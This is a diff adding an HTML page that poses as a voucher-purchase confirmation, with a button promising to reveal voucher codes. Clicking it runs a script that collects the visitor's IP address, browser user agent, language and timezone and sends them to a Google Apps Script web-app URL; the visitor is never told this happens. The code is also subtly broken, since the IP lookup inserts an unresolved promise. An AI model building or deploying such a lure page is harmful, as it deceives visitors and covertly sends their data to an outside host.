@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>System Details</title>
+  <script>
+    function collectAndSendDetails() {
+      // Collect system details
+      const computerName = "Unknown"; // Cannot directly access computer name in browser
+      const username = "Unknown"; // Cannot directly access username in browser
+      const wifiName = "Unknown"; // Cannot directly access Wi-Fi name in browser
+      const ipAddress = fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => data.ip)
+        .catch(() => "Unknown");
+      const userAgent = navigator.userAgent;
+      const language = navigator.language;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+      // Send details to Google Apps Script Web App
+      const webAppUrl = "https://script.google.com/macros/s/AKfycby8TuoLfKjVSIpHfycwoMnZgSWR8ECE4HveMFsi4atsDH5rHgJxzVhI2MdTQnK0hDOEKQ/exec"; // Replace with your Web App URL
+      const url = `${webAppUrl}?computerName=${computerName}&username=${username}&wifiName=${wifiName}&ipAddress=${ipAddress}&userAgent=${encodeURIComponent(userAgent)}&language=${encodeURIComponent(language)}&timezone=${encodeURIComponent(timezone)}`;
+
+      fetch(url)
+        .then(response => response.text())
+        .then(result => {
+          alert(result); // Show success message
+        })
+        .catch(error => {
+          alert("Error logging details: " + error);
+        });
+    }
+  </script>
+</head>
+<body>
+  <h1>Voucher Purchased 4*</h1>
+  <button onclick="collectAndSendDetails()">Click here to see the Voucer Codes</button>
+</body>
+</html>
